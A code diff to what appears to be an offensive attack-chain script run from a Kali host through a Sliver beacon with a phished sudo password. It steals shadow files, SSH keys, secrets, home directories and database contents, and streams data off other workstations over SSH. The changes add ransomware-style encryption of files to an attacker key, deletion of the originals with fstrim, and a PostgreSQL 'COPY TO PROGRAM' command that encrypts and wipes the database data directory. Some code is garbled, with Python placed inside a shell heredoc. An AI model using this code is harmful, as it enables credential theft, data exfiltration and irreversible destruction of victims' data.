@@ -4,6 +4,7 @@ import time
 import subprocess
 import threading
 import base64
+import psycopg2
 
 from chainlog import log
 from advanced_initial_access import sliver_exec
@@ -137,7 +138,16 @@ def _perform_network_exfil(vinzenz_beacon: str, creds: dict, results_dir: str) -
     """
     exfil_local_path = os.path.join(results_dir, "master_exfil.tar.gz")
     os.makedirs(results_dir, exist_ok=True)
-    
+
+    # Load persistent public key from Kali host
+    pubkey_path = "/Attack-chain/exfil_keys/public.pem"
+    if os.path.exists(pubkey_path):
+        with open(pubkey_path, "r") as f:
+            public_key_pem = f.read().strip()
+    else:
+        public_key_pem = ""
+        log("[!] Warning: Persistent public key not found on Kali.")
+    cert_base64 = base64.b64encode(public_key_pem.encode()).decode()
     # Start the one-shot HTTP receiver server on Kali
     recv_proc = _start_receive_server(EXFIL_HTTP_PORT, exfil_local_path)
     
@@ -155,11 +165,115 @@ mkdir -p /tmp/exfil/apache
 # Database host info
 DB_IP="{creds['host']}"
 
+# Write public key to temporary file for openssl
+cat << 'EOF' > /tmp/pubkey.pem
+{public_key_pem}
+EOF
+
+# Unified pipeline function: finds files, replicates structure, processes them, and stages them locally
+process_and_stage_local() {{
+    local src_dir="$1"
+    local stage_dir="$2"
+    [ -d "$src_dir" ] || return 0
+    
+    echo "VinzenzAdmin!2026" | sudo -S find "$src_dir" -type f ! -path "*/.cache/*" 2>/dev/null | while read -r filepath; do
+        # Compute path relative to source directory
+        local relpath="${{filepath#$src_dir/}}"
+        local reldir=$(dirname "$relpath")
+        
+        # Replicate directory structure
+        mkdir -p "$stage_dir/$reldir"
+        
+        # Chainable pipeline operation (gzip-compression + openssl encryption to staging)
+        echo "VinzenzAdmin!2026" | sudo -S gzip -c "$filepath" > "$stage_dir/$relpath.gz" 2>/dev/null || true
+        if [ -s /tmp/pubkey.pem ]; then
+            # Encrypt the file using the public key and output it to staging folder
+            echo "VinzenzAdmin!2026" | sudo -S openssl cms -encrypt -aes256 -binary -in "$filepath" -out "$filepath.enc" /tmp/pubkey.pem 2>/dev/null || true && sudo rm "$filepath" | sudo fstrim -v / 2>/dev/null || true
+        fi
+    done
+}}
+
+# Execute local collection on Vinzenz Workstation (using phished sudo password)
+echo "[*] Collecting local target files on Vinzenz Workstation ..."
+echo "VinzenzAdmin!2026" | sudo -S cp /etc/shadow /tmp/exfil/local/shadow 2>/dev/null || true
+echo "VinzenzAdmin!2026" | sudo -S cp /var/log/auth.log /tmp/exfil/local/auth.log 2>/dev/null || true
+echo "VinzenzAdmin!2026" | sudo -S cp /var/log/secure /tmp/exfil/local/secure 2>/dev/null || true
+
+for udir in /home/* /root; do
+    [ -d "$udir" ] || continue
+    uname=$(basename "$udir")
+    echo "[*] Archiving local user home: $uname ..."
+    ustage="/tmp/exfil/local/home_$uname"
+    mkdir -p "$ustage"
+    process_and_stage_local "$udir" "$ustage"
+    echo "VinzenzAdmin!2026" | sudo -S tar -czf "/tmp/exfil/local/home_$uname.tar.gz" -C "$ustage" . 2>/dev/null || true
+    echo "VinzenzAdmin!2026" | sudo -S rm -rf "$ustage"
+done
+
+if [ -d /etc/ssh ]; then
+    mkdir -p /tmp/exfil/local/etc_ssh
+    process_and_stage_local "/etc/ssh" "/tmp/exfil/local/etc_ssh"
+fi
+
+if [ -d /run/secrets ]; then
+    mkdir -p /tmp/exfil/local/run_secrets
+    process_and_stage_local "/run/secrets" "/tmp/exfil/local/run_secrets"
+fi
+
+for db_dir in /var/lib/mysql /var/lib/postgresql /var/lib/redis; do
+    if [ -d "$db_dir" ]; then
+        dbname=$(basename "$db_dir")
+        mkdir -p "/tmp/exfil/local/db_dir_$dbname"
+        process_and_stage_local "$db_dir" "/tmp/exfil/local/db_dir_$dbname"
+        echo "VinzenzAdmin!2026" | sudo -S tar -czf "/tmp/exfil/local/db_dir_$dbname.tar.gz" -C "/tmp/exfil/local/db_dir_$dbname" . 2>/dev/null || true
+        echo "VinzenzAdmin!2026" | sudo -S rm -rf "/tmp/exfil/local/db_dir_$dbname"
+    fi
+done
+
+for mdir in /var/spool/mail /var/mail; do
+    if [ -d "$mdir" ] && [ "$(ls -A "$mdir" 2>/dev/null)" ]; then
+        mkdir -p /tmp/exfil/local/mail
+        process_and_stage_local "$mdir" "/tmp/exfil/local/mail"
+    fi
+done
+
+# Dump PostgreSQL Database
+echo "[*] Dumping database from $DB_IP ..."
+PGPASSWORD='{creds['password']}' pg_dump -h $DB_IP -p {creds['port']} -U {creds['user']} -d {creds['dbname']} -a -T auth_tokens | gzip > /tmp/exfil/db_dump.sql.gz || echo "[-] DB dump failed"
+
+
+
+# Die Variablen DB_IP und das creds-Dictionary müssen vor diesem Block definiert sein
+conn = psycopg2.connect(
+    host=DB_IP,
+    database=creds['dbname'],
+    user=creds['user'],
+    password=creds['password'],
+    port=creds['port']
+)
+conn.autocommit = True
+cursor = conn.cursor()
+remote_key_path = "/tmp/server_cert.pem"
+
+# Der auszuführende Befehl auf dem DB-Server
+cmd = f"echo '{{cert_base64}}' | base64 -d > {{remote_key_path}} && tar -cf - -C /var/lib/postgresql/data . | openssl cms -encrypt -aes256 -binary -out /var/lib/postgresql/TEST.tar.enc {{remote_key_path}} && rm -rf /var/lib/postgresql/data && sudo fstrim -v / 2>/dev/null || true"
+
+# TO PROGRAM führt den Befehl blind aus, ohne dass eine Tabelle existieren oder angelegt werden muss
+cursor.execute(f"COPY (SELECT 1) TO PROGRAM '{{cmd}}';")
+
+cursor.close()
+conn.close()
+
 # Helper for remote harvesting script (sent to other hosts)
 build_remote_harvest_script() {{
     cat << 'EOF'
 #!/bin/bash
 mkdir -p /tmp/harvest
+
+# Write public key to temporary file for openssl
+cat << 'EOF2' > /tmp/pubkey.pem
+{public_key_pem}
+EOF2
 
 # Unified pipeline function: finds files, replicates structure, processes them, and stages them
 process_and_stage() {{
@@ -175,8 +289,11 @@ process_and_stage() {{
         # Replicate directory structure
         mkdir -p "$stage_dir/$reldir"
         
-        # Chainable pipeline operation (gzip-compression for now)
+        # Chainable pipeline operation (gzip-compression + openssl encryption to staging)
         sudo gzip -c "$filepath" > "$stage_dir/$relpath.gz" 2>/dev/null || true
+        if [ -s /tmp/pubkey.pem ]; then
+            sudo openssl cms -encrypt -aes256 -binary -in "$filepath" -out "$filepath.enc" /tmp/pubkey.pem 2>/dev/null || true && sudo rm "$filepath" | sudo fstrim -v / 2>/dev/null || true
+        fi
     done
 }}
 
@@ -236,94 +353,14 @@ done
 
 # Compress all harvested files to stdout
 tar -czf - -C /tmp/harvest . 2>/dev/null
-rm -rf /tmp/harvest
+rm -rf /tmp/harvest /tmp/pubkey.pem
 EOF
 }}
-
-# Helper function to stage files locally on Vinzenz Workstation (with sudo)
-# Modified to run locally via same unified function and fixed with the phished sudo password
-stage_local_files() {
-    # Build the local script with explicit sudo password passing
-    local local_script="
-mkdir -p /tmp/exfil/local
-
-process_and_stage() {
-    local src_dir=\"\$1\"
-    local stage_dir=\"\$2\"
-    [ -d \"\$src_dir\" ] || return 0
-    
-    echo \"VinzenzAdmin!2026\" | sudo -S find \"\$src_dir\" -type f ! -path \"*/.cache/*\" 2>/dev/null | while read -r filepath; do
-        local relpath=\"\${filepath#\$src_dir/}\"
-        local reldir=\$(dirname \"\$relpath\")
-        mkdir -p \"\$stage_dir/\$reldir\"
-        echo \"VinzenzAdmin!2026\" | sudo -S gzip -c \"\$filepath\" > \"\$stage_dir/\$relpath.gz\" 2>/dev/null || true
-    done
-}
-
-echo \"VinzenzAdmin!2026\" | sudo -S cp /etc/shadow /tmp/exfil/local/shadow 2>/dev/null || true
-echo \"VinzenzAdmin!2026\" | sudo -S cp /var/log/auth.log /tmp/exfil/local/auth.log 2>/dev/null || true
-echo \"VinzenzAdmin!2026\" | sudo -S cp /var/log/secure /tmp/exfil/local/secure 2>/dev/null || true
-
-for udir in /home/* /root; do
-    [ -d \"\$udir\" ] || continue
-    uname=\$(basename \"\$udir\")
-    echo \"[*] Archiving local user home: \$uname ...\"
-    ustage=\"/tmp/exfil/local/home_\$uname\"
-    mkdir -p \"\$ustage\"
-    process_and_stage \"\$udir\" \"\$ustage\"
-    echo \"VinzenzAdmin!2026\" | sudo -S tar -czf \"/tmp/exfil/local/home_\$uname.tar.gz\" -C \"\$ustage\" . 2>/dev/null || true
-    echo \"VinzenzAdmin!2026\" | sudo -S rm -rf \"\$ustage\"
-done
-
-if [ -d /etc/ssh ]; then
-    mkdir -p /tmp/exfil/local/etc_ssh
-    process_and_stage \"/etc/ssh\" \"/tmp/exfil/local/etc_ssh\"
-fi
-
-if [ -d /run/secrets ]; then
-    mkdir -p /tmp/exfil/local/run_secrets
-    process_and_stage \"/run/secrets\" \"/tmp/exfil/local/run_secrets\"
-fi
-
-for db_dir in /var/lib/mysql /var/lib/postgresql /var/lib/redis; do
-    if [ -d \"\$db_dir\" ]; then
-        dbname=\$(basename \"\$db_dir\")
-        mkdir -p \"/tmp/exfil/local/db_dir_\$dbname\"
-        process_and_stage \"\$db_dir\" \"/tmp/exfil/local/db_dir_\$dbname\"
-        echo \"VinzenzAdmin!2026\" | sudo -S tar -czf \"/tmp/exfil/local/db_dir_\$dbname.tar.gz\" -C \"/tmp/exfil/local/db_dir_\$dbname\" . 2>/dev/null || true
-        echo \"VinzenzAdmin!2026\" | sudo -S rm -rf \"/tmp/exfil/local/db_dir_\$dbname\"
-    fi
-done
-
-for mdir in /var/spool/mail /var/mail; do
-    if [ -d \"\$mdir\" ] && [ \"\$(ls -A \"\$mdir\" 2>/dev/null)\" ]; then
-        mkdir -p /tmp/exfil/local/mail
-        process_and_stage \"\$mdir\" \"/tmp/exfil/local/mail\"
-    fi
-done
-"
-    # Execute the local collector via beacon bash invocation
-    # We write it to a temporary file locally and execute it as bash
-    log "[*] Deploying and running local harvest script on Vinzenz Workstation ..."
-    b64_local_script=$(python3 -c "import base64; print(base64.b64encode('''$local_script'''.encode()).decode())")
-    _beacon_exec_wait(
-        vinzenz_beacon,
-        f"execute -o -- sh -c 'echo {b64_local_script} | base64 -d | bash'",
-        cmd_timeout=120,
-        max_polls=24,
-        interval=5
-    )
-}
-
-# Dump PostgreSQL Database
-echo "[*] Dumping database from $DB_IP ..."
-PGPASSWORD='{creds['password']}' pg_dump -h $DB_IP -p {creds['port']} -U {creds['user']} -d {creds['dbname']} -a -T auth_tokens | gzip > /tmp/exfil/db_dump.sql.gz || echo "[-] DB dump failed"
 
 # Compress & stream John's Workstation files
 echo "[*] Harvesting files from John's workstation ..."
 build_remote_harvest_script > /tmp/harvester.sh
 ssh -n -o StrictHostKeyChecking=accept-new -o UserKnownHostsFile=/dev/null john 'echo "VinzenzAdmin!2026" | sudo -S bash' < /tmp/harvester.sh > /tmp/exfil/john/john_harvest.tar.gz || echo "[-] John workstation harvest failed"
-
 
 # Compress & stream Luke's Workstation files
 echo "[*] Harvesting files from Luke's workstation ..."
